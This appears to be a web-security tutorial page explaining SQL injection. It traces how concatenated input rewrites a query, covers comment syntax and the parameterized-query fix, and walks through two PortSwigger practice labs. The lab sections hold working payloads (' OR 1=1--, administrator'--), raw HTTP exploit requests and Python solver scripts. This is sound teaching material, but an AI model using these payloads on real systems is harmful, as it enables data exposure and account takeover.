---
title: SQL Injection · Case File 00 (Mental Model)
description: Follow a single request from your browser into the database and see the exact moment user text turns into a database command.
---

# SQL Injection · The Core Investigation

<p class="wd-section-lede">Forget memorizing long lists of "magic payloads." SQL injection happens for one simple reason: a website builds a database command by gluing your input directly into the sentence, and the database cannot tell where the developer's instructions end and your text begins.</p>

<div class="wd-callout">
<p><strong>💡 Everyday Analogy: The Bank Slip.</strong> Imagine filling out a paper withdrawal slip at a bank. On the line labeled <em>"Your Name"</em>, you write: <code>John — and also, empty the vault into my bag</code>. A human clerk would laugh at you because they know that line is only for a name. A database, however, reads the entire glued sentence as one official command unless the developer keeps your input in a separate, sealed box.</p>
</div>

## Case File #1: Following a Request Behind the Curtain

Let's trace what happens when you browse an online gift shop and click on the **Gifts** category.

<div class="wd-case">
  <div class="wd-step wd-step--see">
    <span class="wd-step__tag">🔎 Step 1 · What You Notice in the Browser</span>
    <p>You click the "Gifts" filter on the store's sidebar. Your browser's address bar changes to <code>/filter?category=Gifts</code>, and the page refreshes to show only public gift items that have been officially released.</p>
  </div>

  <div class="wd-step wd-step--server">
    <span class="wd-step__tag">⚙️ Step 2 · What the Server Does Behind the Scenes</span>
    <p>The server grabs the word <code>Gifts</code> from the URL and pastes it directly into the middle of a SQL command using <Term id="string-concatenation">string concatenation</Term>. Look at how the two pieces are glued together:</p>
    <div class="wd-codesplit">
      <div class="wd-codesplit__legend">
        <span><span class="wd-code-dev">Blue</span> = Developer's SQL Template</span>
        <span><span class="wd-code-input">Gold</span> = Text From Your URL</span>
      </div>
      <span class="wd-code-dev">SELECT * FROM products WHERE category = '</span><span class="wd-code-input">Gifts</span><span class="wd-code-dev">' AND released = 1</span>
    </div>
  </div>

  <div class="wd-step wd-step--break">
    <span class="wd-step__tag">💥 Step 3 · Where the Logic Breaks</span>
    <p>The developer wrapped your input in single quotes (<code>'...'</code>) expecting it to stay trapped inside those quotes forever. Beat that assumption by including a single quote (<code>'</code>) inside your input: the <Term id="lexer-tokenizer">tokenizer</Term> thinks the developer's quote just ended, and treats everything you type after it as live SQL commands.</p>
  </div>

  <div class="wd-step wd-step--fix">
    <span class="wd-step__tag">🛡️ Step 4 · How Developers Lock It Down</span>
    <p>Instead of gluing strings together, developers use a <Term id="parameterized-query">parameterized query</Term> (<code>WHERE category = ?</code>). The database compiles the command structure <em>before</em> your input ever arrives, so even if you type ten single quotes, the database treats them as harmless text characters inside a search word.</p>
  </div>
</div>

### Visual Comparison: Glued Text vs. Parameterized Box

<div class="wd-compare">
  <div class="wd-compare__card wd-compare__card--expect">
    <span class="wd-compare__title">💭 What the Developer Expected</span>
    <p>The developer thought single quotes worked like a locked cage: whatever the user typed in <code>category</code> would only ever be compared as a category name, and <code>AND released = 1</code> would always hide unreleased products.</p>
  </div>
  <div class="wd-compare__card wd-compare__card--actual">
    <span class="wd-compare__title">💥 What Actually Happened</span>
    <p>When the user sends <code>Gifts'--</code>, the quote closes the category name early, and the <code>--</code> comment marker tells the database to cross out the rest of the line—erasing the <code>AND released = 1</code> check completely.</p>
  </div>
</div>

### Watch the Query Change Meaning Color by Color

Look at what happens inside the database when `category` is set to `' OR 1=1--`:

<div class="wd-codesplit">
  <div class="wd-codesplit__legend">
    <span><span class="wd-code-dev">Blue</span> = Developer Code</span>
    <span><span class="wd-code-input">Gold</span> = Injected Input</span>
    <span><span class="wd-code-dead">Strikethrough</span> = Erased by Comment</span>
  </div>
  <span class="wd-code-dev">SELECT * FROM products WHERE category = '</span><span class="wd-code-input">' OR 1=1--</span><span class="wd-code-dead">' AND released = 1</span>
</div>

::: details 🔬 Under the Hood: Why Parameterized Queries Never Fall for This
When an app uses a <Term id="parameterized-query">parameterized query</Term>, two completely separate messages are sent to the database:
1. **The Blueprint:** `SELECT * FROM products WHERE category = ? AND released = 1`
2. **The Value Bag:** `Param 1 = ' OR 1=1--`

Because the database finishes building its execution plan during Step 1, it is physically impossible for Step 2 to add a new `OR` clause or comment out `AND released = 1`. The database simply searches for a category literally named `' OR 1=1--` and returns zero rows.
:::

---

## The 5-Stage Journey of Every Database Query

Every time your request hits the server, it passes through five checkpoints. Understanding these five checkpoints tells you *why* an error happened and *where* to adjust your input:

<div class="wd-flow">
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>1. String Gluing</strong>
    App pastes your URL text into the SQL string. (The bug is born here!)
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>2. Tokenizer</strong>
    Splits characters into quotes, words, and comments (<code>'</code>, <code>OR</code>, <code>--</code>).
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>3. Grammar Check</strong>
    Checks if the SQL sentence structure makes sense.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>4. Table &amp; Type Check</strong>
    Verifies table names exist and column types match.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>5. Execution</strong>
    Runs the command and returns rows, an error, or a time delay.
  </div>
</div>

---

## Punctuation That Changes the Story

Before a database understands words like `SELECT` or `WHERE`, its <Term id="lexer-tokenizer">tokenizer</Term> scans for special punctuation marks. Here are the only symbols you need to know:

| Symbol | What the Database Sees | Why It Matters in an Investigation |
| --- | --- | --- |
| `'` | Opens or closes a text string | Lets you step out of "user data mode" and start writing SQL instructions |
| `--` | "Ignore the rest of this line" (Comment) | Cleanly erases the developer's leftover quotes and filters at the end of the query |
| `#` | MySQL's alternate "Ignore the rest of this line" | Works just like `--` in MySQL without needing a space after it |
| `/* ... */` | "Ignore everything between these markers" | Lets you snip out a piece in the middle of a query or replace spaces |
| `;` | End of sentence, start a brand-new query | Allows running a second statement on engines that permit stacked queries |

::: details ⚙️ Database Engine Quirks: The MySQL Space Trap
One tiny rule trips up almost everyone at first: **how different databases read `--` comments.**

| Database Engine | Line Comment Syntax | The Gotcha |
| --- | --- | --- |
| **PostgreSQL / Oracle / SQL Server** | `--` | Works immediately (`'--` is valid). |
| **MySQL / MariaDB** | `-- ` *(dash-dash-SPACE)* or `#` | In MySQL, `--` **must** be followed by a space (encoded as `+` or `%20` in URLs), or MySQL treats it as math subtraction instead of a comment! |
:::

---

## How Does the Server Answer You? (The 3 Channels)

Not every vulnerable page prints database rows back on the screen. We group SQL injection into three families based on **how you see the answer**:

<div class="wd-flow">
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>📢 1. In-Band (Direct)</strong>
    The webpage directly prints the new rows (via <code>UNION</code>) or shows a detailed database error message on screen.
  </div>
  <div class="wd-flow__node">
    <strong>🕵️ 2. Blind (Clue-Based)</strong>
    The page never prints database data, but changes slightly (a "Welcome" message appears, a 500 error triggers, or the response pauses for 5 seconds).
  </div>
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>📡 3. Out-of-Band (Phone Home)</strong>
    The page changes nothing at all, so you ask the database to make a DNS/HTTP lookup to a server you control (<Term id="out-of-band-oast">OAST</Term>).
  </div>
</div>

---

## The Detective's Step-by-Step Testing Routine

When you suspect a URL parameter might be talking to a database, don't guess randomly. Change **one thing at a time** and watch how the server reacts:

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>Step 1: Normal Click</strong>
    Send <code>Gifts</code>. Note the normal page size and product count.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>Step 2: Single Quote</strong>
    Send <code>Gifts'</code>. Did a 500 error appear or did products vanish?
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>Step 3: Double Quote Repair</strong>
    Send <code>Gifts''</code>. If the page goes back to normal, you're inside a SQL string!
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>Step 4: True vs. False</strong>
    Compare <code>Gifts' AND 1=1--</code> (True) vs <code>Gifts' AND 1=2--</code> (False).
  </div>
</div>

::: details 🔬 Under the Hood: Why `Gifts''` Repairs the Error
In SQL, typing two single quotes right next to each other (`''`) inside a string doesn't close and reopen the string—it represents one literal apostrophe (like in the name `O'Reilly`, written as `'O''Reilly'`).

So when `Gifts'` breaks the page with an odd number of quotes, and `Gifts''` magically brings the normal page back, you have proven beyond a shadow of a doubt that a SQL parser is reading your quotes!
:::

---

## Practice Labs: Your First Two Cases

Put the detective flow into action on these two Apprentice labs. Use the **Clue buttons** if you want a nudge without spoiling the full solution!

:::: lab

## Lab 1 · Retrieving hidden data {#lab-retrieve-hidden-data}

* **The Scenario:** When you click a product category on this store, the server runs `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`.
* **Your Mission:** Make the store display all products—including secret unreleased ones—by neutralizing the `AND released = 1` check.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

<LabCheckbox lab-id="lab-retrieve-hidden-data" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** Look at the `category` value in the URL bar after clicking any category. What happens if your category name closes the opening quote early and comments out the rest of the query?

**Level 2 — target parameter and approach.** Close the quote after the category name, add an <Term id="tautology">always-true condition</Term> (`OR 1=1`) so every row matches, and add `--` to erase `AND released = 1`.

**Level 3 — exploit skeleton.**

```http
GET /filter?category=%27+OR+1%3D1-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

Decoded, the value is `' OR 1=1--`. (In URLs, `+` is simply a space.)
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request

```http
GET /filter?category=%27+OR+1%3D1-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
Accept: text/html
Connection: close
```

### The query before and after

<div class="wd-codesplit">
  <div class="wd-codesplit__legend">
    <span><span class="wd-code-dev">Blue</span> = Developer SQL</span>
    <span><span class="wd-code-input">Gold</span> = Your Input</span>
    <span><span class="wd-code-dead">Strikethrough</span> = Commented Out</span>
  </div>
  <span class="wd-code-dev">SELECT * FROM products WHERE category = '</span><span class="wd-code-input">' OR 1=1--</span><span class="wd-code-dead">' AND released = 1</span>
</div>

The database now returns every row where `category = ''` **OR** `1=1`. Since `1=1` is always true for every row in the table, every single product—released or unreleased—is displayed on the page.

### Every piece explained in plain English

| Piece | What It Means | Why You Need It |
| --- | --- | --- |
| `%27` (`'`) | Single quote | Closes the `'Gifts'` text box early so the database listens for SQL commands |
| `+` (space) | Space separator | Keeps `'` and `OR` separated as distinct tokens |
| `OR` | Logical "Either/Or" | Tells the database to accept rows that pass *either* the first check or our new check |
| `1=1` | Always-true check | Since 1 always equals 1, every row in the `products` table passes the filter |
| `--` | Line comment | Crosses out the leftover `' AND released = 1` so it doesn't cause a syntax error or hide items |

### Python `requests` solver

```python
import sys
import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance

def main() -> None:
    s = requests.Session()
    baseline = s.get(f"{BASE}/filter", params={"category": "Gifts"}, timeout=20)
    exploit = s.get(f"{BASE}/filter", params={"category": "' OR 1=1--"}, timeout=20)

    print(f"baseline: {baseline.status_code}, {len(baseline.text)} bytes")
    print(f"exploit : {exploit.status_code}, {len(exploit.text)} bytes")

    cards_before = baseline.text.count('class="product-card"')
    cards_after = exploit.text.count('class="product-card"')
    print(f"product cards: {cards_before} -> {cards_after}")

    if cards_after > cards_before:
        print("[+] Hidden products are now visible. Lab solved.")
    else:
        print("[!] No new products. Check the lab URL and cookie/session state.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```
:::

::::

:::: lab

## Lab 2 · Login bypass {#lab-login-bypass}

* **The Scenario:** When you submit the login form, the backend checks your credentials by running `SELECT * FROM users WHERE username = '<USER>' AND password = '<PASS>'`.
* **Your Mission:** Log in as the `administrator` user without knowing their password.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

<LabCheckbox lab-id="lab-login-bypass" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** Look closely at the query: it checks the username **AND** the password on the exact same line. What happens if the query ends right after the username check?

**Level 2 — target parameter and approach.** In the `username` box on the login page, type `administrator`, close the quote (`'`), and start a comment (`--`) so the `AND password = '...'` part is completely ignored. Type anything you want in the password box.

**Level 3 — exploit skeleton.**

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=administrator%27--&password=anypassword
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request

```http
POST /login HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Connection: close

username=administrator%27--&password=
```

### The query before and after

<div class="wd-codesplit">
  <div class="wd-codesplit__legend">
    <span><span class="wd-code-dev">Blue</span> = Developer SQL</span>
    <span><span class="wd-code-input">Gold</span> = Your Input</span>
    <span><span class="wd-code-dead">Strikethrough</span> = Commented Out</span>
  </div>
  <span class="wd-code-dev">SELECT * FROM users WHERE username = '</span><span class="wd-code-input">administrator'--</span><span class="wd-code-dead">' AND password = ''</span>
</div>

The query now simply asks: *"Give me the user whose username is `administrator`."* Because the password check was erased by `--`, the database returns the administrator's account row, and the login handler logs you right in.

### Every piece explained in plain English

| Piece | What It Means | Why You Need It |
| --- | --- | --- |
| `administrator` | Target account | Tells the database which user profile row to fetch |
| `%27` (`'`) | Single quote | Closes the username text field cleanly |
| `--` | Line comment | Erases `' AND password = '...'` so the server never checks the password |

### Python `requests` solver

```python
import sys
import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance

def main() -> None:
    s = requests.Session()
    s.get(f"{BASE}/login", timeout=20)

    resp = s.post(
        f"{BASE}/login",
        data={"username": "administrator'--", "password": "ignored"},
        allow_redirects=True,
        timeout=20,
    )

    if "Log out" in resp.text or "/my-account" in resp.url:
        print("[+] Logged in as administrator. Lab solved.")
        print(f"    final URL: {resp.url}")
    else:
        print("[!] Login did not succeed. Verify the lab host.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```
:::

::::

<TopicComplete topic-id="sql-injection/fundamentals" label="Mark Case File 00 (SQLi Mental Model) Complete" />
